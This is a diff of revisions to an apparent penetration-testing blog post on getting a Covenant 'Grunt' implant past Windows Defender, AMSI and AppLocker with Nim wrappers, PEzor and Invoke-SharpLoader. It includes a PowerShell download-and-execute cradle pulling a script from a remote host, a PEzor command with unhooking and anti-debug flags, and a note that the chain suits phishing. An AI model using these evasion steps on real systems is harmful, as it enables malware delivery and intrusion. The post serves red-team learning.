@@ -74,13 +74,13 @@ A usefull tool that comes in handy when you want to test your new code against W
 
 ![broken]({{ site.baseurl }}/images/2021-16-01/ThreatCheck.png "ThreatCheck")   
 
-There are tools out there, that will do the job for you. Feel free to have a look at the [obfuscation section](https://github.com/LuemmelSec/Pentest-Tools-Collection#obfuscation) of my github repo, or just do some creative googling.  
+There are tools out there, that will do the obfuscation job for you. Feel free to have a look at the [obfuscation section](https://github.com/LuemmelSec/Pentest-Tools-Collection#obfuscation) of my github repo, or just do some creative googling.  
 
 ### Wrapping and decrypting code  
 
-If you are actively following the InfoSec community on twitter, you will most probably stumble upon [byt3bl33d3r´s](https://twitter.com/byt3bl33d3r) [Offensive Nim repo](https://github.com/byt3bl33d3r/OffensiveNim).  This tool let´s you wrap your C# executable inside Nim and be compiled as C executable, thus hiding your content. Together with [s3cur3th1sh1t](https://twitter.com/ShitSecure) they even developed it further, so that you can decrypt your payload inside Nim, and have it decrypted at runtime in memory. This will make it way harder to impossible to reverse, if you have to put your files on disk, as decompiling will only reveal the encrypted C# stuff. To learn more on this you can check out [Playing-with-OffensiveNim](https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/).  
+If you are actively following the InfoSec community on twitter, you will most probably stumble upon [byt3bl33d3r´s](https://twitter.com/byt3bl33d3r) [Offensive Nim repo](https://github.com/byt3bl33d3r/OffensiveNim). These templates let you wrap your C# executable inside Nim and be compiled as C executable, thus hiding your content. Together with [s3cur3th1sh1t](https://twitter.com/ShitSecure) they even developed it further, so that you can have a decrypted payload inside the Nim binary, and have it decrypted at runtime in memory. This will make it way harder to impossible to reverse, if you have to put your files to disk, as decompiling will only reveal the encrypted C# stuff. To learn more on this you can check out [Playing-with-OffensiveNim](https://s3cur3th1ssh1t.github.io/Playing-with-OffensiveNim/).  
 
-There are also tools like [amber](https://github.com/EgeBalci/amber) or [PEzor](https://github.com/phra/PEzor), which will take C or C++ executables and reflectively load them into memory, adding some nice features like delayed execution too fool in memory scanners, avoiding AV user-land hooks and stuff. I don´t understand even half of the things that are going on here. But if you want to know more read [phra´s](https://twitter.com/phraaaaaaa) [blog](https://iwantmore.pizza/posts/PEzor.html) regarding PEZor.  
+There are also tools like [amber](https://github.com/EgeBalci/amber) or [PEzor](https://github.com/phra/PEzor), which will take C or C++ executables and reflectively load them into memory, adding some nice features like delayed execution too fool in memory scanners or avoiding AV user-land hooks and stuff. I don´t understand even half of the things that are going on here. But if you want to know more read [phra´s](https://twitter.com/phraaaaaaa) [blog](https://iwantmore.pizza/posts/PEzor.html) regarding PEZor.  
 
 All the above mentioned methods can possibly help you obfuscate your code, so you don´t have to deploy the out of the box tools.  
 But be aware that by the time also the wrapper code will get flagged. I did a test with a simple ```hello world``` C executable wrapped with PEZor, and I got like 21 hits on VirusTotal.
@@ -88,18 +88,19 @@ By now you should know what to do :) Obfuscate the wrappers.
 
 ### Not touching the disk  
 
-Another approach is to try to not touch the disk with our malicious content, so that traditional AV is not able to catch us when reading from or writing to disk.  
+Another approach is to try to not touch the disk with our malicious content, so that traditional AV is not able to catch us when reading or writing data.  
 The most well known technique to me is to use PowerShell´s Invoke Expression feature. It will allow you to download a script from a remote source and execute it in memory.  
 ```
 iex(new-object net.webclient).downloadstring('http://10.55.0.30/grunt.ps1')
 ```  
 
-Another possibility is to use [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) from - *who would have thought it* - S3cur3Th1sSh1t.  
+Another possibility is to use [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) from - *who would have thought it* - S3cur3Th1sSh1t, to load and execute C# directly into memory.  
+    
 Okay so let´s bypass Defender by not touching the disk and put our default Grunt payload directly into memory:
 
 ![broken]({{ site.baseurl }}/images/2021-16-01/ASMI_catch.png "AMSI Catch")  
 
-Fuck! Something went wrong. Looks like we got catched by AMSI which detected a Covenant payload.  
+*Fuck! Something went wrong. Looks like we got catched by AMSI which detected a Covenant payload.*  
 
 We bypassed the signature based part of Defender for the filesystem stuff, but AMSI checked our script when we loaded it to memory, handed it over to Defender who then found the suspicious strings, flagging it as malicious.  
 
@@ -110,14 +111,16 @@ We can verify that it was AMSI by issuing ~~one of the random bypasses from [ams
 ![broken]({{ site.baseurl }}/images/2021-16-01/CSharp_AMSI_bypass.png "bypass")  
 ![broken]({{ site.baseurl }}/images/2021-16-01/CSharp_AMSI_bypass_grunt.png "bypass")  
 
-I failed hard for several times with all the amsi.fail bypasses for the Grunt payload. Talking to my boss (*you know the guy with the l33t name containing sh1t and stuff*) it turns out that for C# payloads - the 2nd stage of the Grunt payload which is C# - you need to have a bypass for C#. Holy moly, but that´s how it is.  
+I failed hard for several times with all the [amsi.fail](https://amsi.fail) bypasses for the Grunt payload. Talking to my boss (*you know the guy with the l33t name containing sh1t and stuff*) it turns out that for C# payloads - the 2nd stage of the Grunt payload which is C# - you need to have a bypass for C#. Holy moly, but that´s how it is. Thank you sir.   
 
-### Combining stuff  
+### Chaining the tricks 
 
-For obvious reasongs I also played with Nim, Invoke-SharpLoader, PEZor and all the other crazy stuff.  
+For obvious reasons I played with Nim, Invoke-SharpLoader, PEZor and all the other crazy stuff.  
 My attempts to combine the parts to chain a stealthy attack resulted in two approaches that look like the following:  
 
-#### Grunt.exe -> Nim Wrapper -> PEZor -> local execution  
+#### Grunt.exe -> Nim Wrapper -> PEZor -> local execution 
+
+Just to try to avoid local detection when copied to disk.   
 
 1. Create Grunt.exe  
 ![broken]({{ site.baseurl }}/images/2021-16-01/Create_Grunt_exe.png "create Grunt")  
@@ -141,11 +144,14 @@ PEzor.sh -sgn -unhook -antidebug -text -syscalls -sleep=10 /root/Desktop/Grunt_N
 
 5. Deploy  
 ![broken]({{ site.baseurl }}/images/2021-16-01/Covenant_PEZor_run.png "PEZor run")  
+
+*Tada - Grunt incoming*  
 ![broken]({{ site.baseurl }}/images/2021-16-01/Covenant_PEZor_success.png "PEZor success")  
 
 #### AppLocker & Constrained language bypass -> Powershell load script -> AMSI bypass -> Invoke-SharpLoader -> Encrypted Grunt
 
-If there wasn´t the AppLocker bypass needed, one could also run this completely from remote, i.e. in a phishing campaing starting with a .htm which runs our loader script.  
+If there wasn´t the AppLocker bypass needed, one could also run this completely from remote, i.e. in a phishing campaign starting with a .htm file or something liek this, which runs our loader script.  
+The whole attack is carried out on a low priv account.  
 
 1. Identify a way to bypass AppLocker and ConstrainedLanguage
 
@@ -163,7 +169,7 @@ Get-ApplockerPolicy -Effective -xml > c:\users\luemmel\Desktop\applocker.xml
 
 ![broken]({{ site.baseurl }}/images/2021-16-01/applocker_allow_dll.png  "Allow dll")
 
-We can see that the **Everyone** group is allowed to run stuff from **C:\Program Files (x86)\hMailServer\**
+We can see that the **Everyone** group is allowed to run stuff from **C:\Program Files (x86)\hMailServer\\**
 
 We can further check the ACLs on that folder with the following PS cmdlet:  
 ```
